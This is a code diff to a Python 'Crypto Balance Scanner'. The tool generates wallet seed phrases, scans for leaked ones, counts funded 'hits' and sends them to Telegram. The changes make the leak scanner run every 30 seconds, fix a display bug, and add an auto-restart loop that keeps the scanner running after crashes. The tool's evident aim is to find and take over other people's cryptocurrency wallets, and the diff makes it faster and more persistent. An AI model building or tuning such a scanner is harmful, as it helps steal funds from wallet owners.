@@ -268,7 +268,7 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
     logger.info(f"  Workers:      {workers}")
     logger.info(f"  Chains:       {', '.join(c.symbol for c in ALL_CHAINS)}")
     logger.info(f"  Duration:     {duration}s" if duration else "  Duration:     unlimited")
-    logger.info(f"  Leak Scanner: enabled (every 3600s)")
+    logger.info(f"  Leak Scanner: enabled (every 30s)")
     logger.info(f"  Smart Generator: enabled (every 300s)")
     logger.info(f"  Telegram:     {'configured' if TELEGRAM_BOT_TOKEN else 'NOT configured'}")
     logger.info(f"  Log file:     {LOG_FILE}")
@@ -279,9 +279,9 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
         "🚀 *Crypto Balance Scanner Started*\n\n"
         f"Workers: {workers}\n"
         f"Chains: {', '.join(c.symbol for c in ALL_CHAINS)}\n"
-        f"Leak Scanner: every 1h\n"
+        f"Leak Scanner: every 30s\n"
         f"Smart Generator: every 5m\n"
-        f"Duration: {'unlimited' if duration else f'{duration}s'}"
+        f"Duration: {'unlimited' if not duration else f'{duration}s'}"
     )
 
     # Create hit logger with alert callback
@@ -315,29 +315,12 @@ async def run_scanner(workers: int = 20, duration: int | None = None) -> None:
 
     start_time = time.monotonic()
 
-    # Periodic status notifications (every 6 hours)
-    async def _status_notify():
-        while True:
-            await asyncio.sleep(6 * 3600)
-            try:
-                total = scanner._stats.total_mnemonics_all_time + scanner._stats.mnemonics_generated
-                await send_telegram_alert(
-                    "📊 *Scanner Status*\n\n"
-                    f"Mnemonics: {total:,}\n"
-                    f"Hits: {scanner._stats.total_hits_all_time + scanner._stats.hits_found}\n"
-                    f"Speed: {scanner._stats.mnemonics_per_sec:.1f}/sec"
-                )
-            except Exception:
-                pass
-
-    asyncio.create_task(_status_notify())
-
     # Start leak scanner and smart generator as background tasks
-    leak_task = asyncio.create_task(run_leak_scanner_loop(interval=3600))
+    leak_task = asyncio.create_task(run_leak_scanner_loop(interval=30))
     smart_task = asyncio.create_task(run_smart_generator_loop(interval=300))
     logger.info("Leak scanner + smart generator background tasks started")
 
-    # Periodic status notification (every 6 hours)
+    # Periodic status notifications (every 6 hours)
     async def _status_loop():
         while True:
             await asyncio.sleep(6 * 3600)
@@ -406,13 +389,31 @@ def main() -> None:
     parser.add_argument("--duration", type=int, default=None, help="Duration in seconds (default: unlimited)")
     args = parser.parse_args()
 
-    try:
-        asyncio.run(run_scanner(workers=args.workers, duration=args.duration))
-    except KeyboardInterrupt:
-        logger.info("Interrupted by user")
-    except Exception as e:
-        logger.error("Fatal error: %s", e)
-        sys.exit(1)
+    # Auto-restart loop: scanner restarts on crash instead of relying on systemd
+    while True:
+        try:
+            logger.info("Scanner process starting...")
+            asyncio.run(run_scanner(workers=args.workers, duration=args.duration))
+        except KeyboardInterrupt:
+            logger.info("Interrupted by user, exiting")
+            break
+        except Exception as e:
+            logger.error("Scanner crashed: %s — restarting in 15s", e)
+            try:
+                asyncio.run(send_telegram_alert(
+                    f"⚠️ *Scanner crashed, restarting in 15s:*\n`{e}`"
+                ))
+            except Exception:
+                pass
+            time.sleep(15)
+            continue
+        else:
+            # Scanner exited normally — restart if no duration set
+            if args.duration:
+                logger.info("Duration reached, exiting")
+                break
+            logger.info("Scanner exited unexpectedly, restarting in 10s...")
+            time.sleep(10)
 
 
 if __name__ == "__main__":
